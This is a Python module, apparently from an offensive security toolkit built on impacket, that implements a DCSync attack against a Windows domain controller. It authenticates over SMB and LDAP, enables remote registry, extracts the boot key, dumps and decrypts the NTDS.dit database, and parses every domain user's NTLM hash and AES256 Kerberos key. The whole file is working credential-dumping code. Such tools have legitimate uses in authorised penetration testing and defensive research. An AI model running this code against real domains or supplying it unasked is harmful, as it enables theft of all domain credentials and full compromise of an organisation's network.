from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
from impacket.smbconnection import SMBConnection
from impacket.ldap.ldap import LDAPConnection
from impacket.dcerpc.v5.rpcrt import DCERPCException
import io
from contextlib import redirect_stdout
import sys
from pympacket.models.common import User

def dcsync(target, username, domain, password='', nthash=''):
    """Performs a DC Synchronization against a Domain Controller to retrieve all Domain User credentials from the synchronized NTDS.dit database"""
    try:
        smb_conn = SMBConnection(target, target)
    except:
        print("Host unreachable.\n", file=sys.stderr)
        return None
    try:
        smb_conn.login(user=username, password=password, nthash=nthash, domain=domain)
    except:
        print("Invalid credentials provided.\n", file=sys.stderr)
        return None
    
    # Convert domain name in a LDAP domain base (e.g. DC=contoso,DC=local)
    base_dn = ''
    split_domain = domain.split('.')
    for dom_slice in split_domain:
        base_dn = base_dn + f'dc={dom_slice},'
    base_dn = base_dn[:-1]

    try:
        ldapConnection = LDAPConnection(f'ldap://{target}', base_dn, target)
    except:
        print("LDAP connection error, the target provided must be the DC.\n", file=sys.stderr)
        return None
        
    # Login can't fail if it succeded with smb
    ldapConnection.login(user=username, password=password, domain=domain, nthash=nthash)

    # Create a RemoteOperations instance to perform remote operations on the DC
    remote_ops = RemoteOperations(smb_conn, False, target, ldapConnection)
    try:
        remote_ops.enableRegistry() # Enable remote registry on the DC
        boot_key = remote_ops.getBootKey() # Retrieve the bootkey from the DC, to decrypt the NTDS database
        ntds_filename = remote_ops.saveNTDS() # Dump the NTDS database
    except DCERPCException as e:
        if str(e).find('rpc_s_access_denied') >= 0:
            print("The current user doesn't have enough rights.\n", file=sys.stderr)
            try:
                remote_ops.finish()
            except:
                print("Problem with cleanup.\n", file=sys.stderr)
            return None
        else:
            print("Error when retrieving required information via RPC.\n", file=sys.stderr)
            return None

    # Decrypt the NTDS.dit with the bootkey
    ntds = NTDSHashes(ntds_filename, boot_key, isRemote=True, remoteOps=remote_ops, justNTLM=False)

    # Capture function stdout for parsing
    f = io.StringIO()
    with redirect_stdout(f):
        try:
            ntds.dump() # Outputs all retrieved domain credentials
        except Exception as e:
            if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
                print("The current user doesn't have DCSync rights.\n", file=sys.stderr)
                return None
            else:
                print("Error while performing DCSync.\n", file=sys.stderr)
                return None
    dcsync_out = parse_output(f.getvalue())

    # Cleanup
    try:
        remote_ops.finish()
        ntds.finish()
    except:
        print("Problem with cleanup.\n", file=sys.stderr)

    return dcsync_out

def parse_output(ntds_dump):
    dcsync_out = []
    entries = ntds_dump.split("\n")
    for entry in entries:
        split_list = entry.split(':')
        if len(split_list) == 7: # Filter only for valid entries with full data
            current_user = User()
            current_user.username = split_list[0]
            current_user.nthash = split_list[3]
            dcsync_out.append(current_user)
        elif len(split_list) == 3 and split_list[1] == 'aes256-cts-hmac-sha1-96': # Kerberos keys will always come after ntlm hashes
            username = split_list[0]
            for user in dcsync_out:
                if user.username == username:
                    user.aes256 = split_list[2]
    return dcsync_out